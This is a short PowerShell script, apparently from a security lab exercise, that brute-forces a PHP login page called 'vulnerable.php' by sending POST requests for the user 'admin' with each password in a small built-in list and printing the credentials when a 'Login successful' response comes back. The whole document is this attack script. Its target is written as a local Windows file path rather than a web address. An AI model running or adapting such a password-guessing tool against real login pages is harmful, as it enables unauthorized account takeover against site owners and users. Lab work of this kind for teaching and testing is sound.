# Set target URL (the PHP login form endpoint)
$targetURL = "C:\wamp64\www\BCS_Sy01\broke\vulnerable.php"

# Set username to be attacked
$username = "admin"

# Password dictionary (you can add more passwords to this list)
$passwords = @(
    "password123",
    "admin",
    "123456",
    "supersecret",
    "qwerty",
    "supersecret123"
)

# Loop through the password list and attempt brute-force attack
foreach ($password in $passwords) {
    # Prepare the POST data
    $postData = @{
        "username" = $username
        "password" = $password
    }

    # Send the POST request
    try {
        $response = Invoke-RestMethod -Uri $targetURL -Method Post -Body $postData -ContentType "application/x-www-form-urlencoded"
    }
    catch {
        Write-Host "[ERROR] Unable to connect to $targetURL" -ForegroundColor Red
        exit
    }

    # Check the response text
    if ($response -like "*Login successful*") {
        Write-Host "[SUCCESS]" -ForegroundColor Green -NoNewline
        Write-Host " USERNAME: " -ForegroundColor Cyan -NoNewline
        Write-Host $username -ForegroundColor Yellow
        Write-Host "PASSWORD: " -ForegroundColor Cyan -NoNewline
        Write-Host $password -ForegroundColor Magenta
        break
    }
    else {
        Write-Host "[FAILED] Attempt with password '$password'" -ForegroundColor Red
    }

    # Optional: Add a delay between requests for demonstration purposes (1 second)
    Start-Sleep -Seconds 1
}

Write-Host "Brute-force attack completed."
